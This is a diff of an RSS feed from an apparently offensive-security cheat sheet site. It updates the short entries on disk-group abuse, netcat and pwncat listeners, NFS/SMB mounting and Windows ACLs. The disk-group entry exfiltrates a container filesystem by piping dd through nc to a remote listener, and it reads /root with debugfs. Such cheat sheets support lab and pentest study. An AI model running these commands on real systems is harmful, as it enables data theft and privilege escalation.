@@ -68,7 +68,7 @@
       <link>https://tldrbins.github.io/disk/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/disk/</guid>
-      <description>Abuse disk group to read container&amp;rsquo;s filesystem # Show devices lsblk # Show LVM mappings ls -l /dev/mapper/ # In our local machine nc -lvnp 4444 &amp;gt; dm-0.gz # Exfil filesystem (target container rootfs, e.g. dm-0) dd if=/dev/dm-0 | gzip -1 - | nc 10.10.14.10 4444 # Extract dm-0 gunzip dm-0.gz # Mount the filesystem sudo mount dm-0-orig /mnt/ # Privilege read ls /mnt/root/ Note: can take a long time to transfer</description>
+      <description>Basic # Show devices lsblk # Device attributes blkid # Show swap on blk swapon -s # Filesystem info cat /etc/fstab Abuse disk group to read root filesystem # Open target device debugfs /dev/sda1 # Exploit ls /root Abuse disk group to read container&amp;rsquo;s filesystem # Show LVM mappings ls -l /dev/mapper/ # In our local machine nc -lvnp 4444 &amp;gt; dm-0.gz # Exfil filesystem (target container rootfs, e.g. dm-0) dd if=/dev/dm-0 | gzip -1 - | nc 10.</description>
     </item>
     <item>
       <title>DNS Enum</title>
@@ -194,7 +194,7 @@
       <link>https://tldrbins.github.io/listeners/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/listeners/</guid>
-      <description> nc rlwrap nc -lvnp 1337 pwncat Download pwncat&#xA;pwncat-cs -lp 1337 #After getting a connection (local) pwncat$ back </description>
+      <description> nc rlwrap nc -lvnp 1337 pwncat Download pwncat&#xA;pwncat-cs -lp 1337 # After getting a connection (local) pwncat$ back </description>
     </item>
     <item>
       <title>lxd</title>
@@ -250,7 +250,7 @@
       <link>https://tldrbins.github.io/share_mount/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/share_mount/</guid>
-      <description>NFS List share showmount -e 10.10.11.10 Mount share sudo mount -t nfs 10.10.11.10:/share /mnt/share/ Others # Check all mounted drives mount # Check how shares are mounted cat /etc/exports # root_squash : running as root on local system will be treated as the default nobody user in target # no_all_squash: every other users permission will translate from local system to target SMB Mount share sudo mount -t cifs //10.10.11.10/share /mnt # With creds sudo mount -t cifs -o user=username,pass=password //10.</description>
+      <description>NFS List share showmount -e 10.10.11.10 Mount share sudo mount -t nfs 10.10.11.10:/share /mnt/share/ Others # Check all mounted drives mount # Check how shares are mounted cat /etc/exports +----------------------------------------------------------------------------------------+ |root_squash : running as root on local system will be treated as nobody user in target | |no_all_squash: every other users permission will translate from local system to target | +----------------------------------------------------------------------------------------+ SMB Mount share sudo mount -t cifs //10.10.11.10/share /mnt # With creds sudo mount -t cifs -o user=username,pass=password //10.</description>
     </item>
     <item>
       <title>MSSQL General</title>
@@ -488,7 +488,7 @@
       <link>https://tldrbins.github.io/windows_acls/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/windows_acls/</guid>
-      <description> Window ACLs (Access Control Lists) Check ACLs icacls &amp;#34;C:\Users\User&amp;#34; +-------------------------------------------------+ |F (full access) | |M (modify access) | |RX (read and execute access) | |R (read-only access) | |W (write-only access) | |D (delete) | |RC (read control) | |WDAC (write DAC) | |WO (write owner) | |S (synchronize) | |AS (access system security) | |MA (maximum allowed) | |GR (generic read) | |GW (generic write) | |GE (generic execute) | |GA (generic all) | |RD (read data/list directory) | |WD (write data/add file) | |AD (append data/add subdirectory) | |REA (read extended attributes) | |WEA (write extended attributes) | |X (execute/traverse) | |DC (delete child) | |RA (read attributes) | |WA (write attributes) | |OI (object inherit) | |CI (container inherit) | |IO (inherit only) | |NP (do not propagate inherit) | |I (permission inherited from parent container)| +-------------------------------------------------+ </description>
+      <description> Window ACLs (Access Control Lists) Check ACLs icacls &amp;#34;C:\Users\User&amp;#34; Grant user full control icacls file_name /grant user:F +-------------------------------------------------+ |F (full access) | |M (modify access) | |RX (read and execute access) | |R (read-only access) | |W (write-only access) | |D (delete) | |RC (read control) | |WDAC (write DAC) | |WO (write owner) | |S (synchronize) | |AS (access system security) | |MA (maximum allowed) | |GR (generic read) | |GW (generic write) | |GE (generic execute) | |GA (generic all) | |RD (read data/list directory) | |WD (write data/add file) | |AD (append data/add subdirectory) | |REA (read extended attributes) | |WEA (write extended attributes) | |X (execute/traverse) | |DC (delete child) | |RA (read attributes) | |WA (write attributes) | |OI (object inherit) | |CI (container inherit) | |IO (inherit only) | |NP (do not propagate inherit) | |I (permission inherited from parent container)| +-------------------------------------------------+ </description>
     </item>
     <item>
       <title>Wordpress</title>
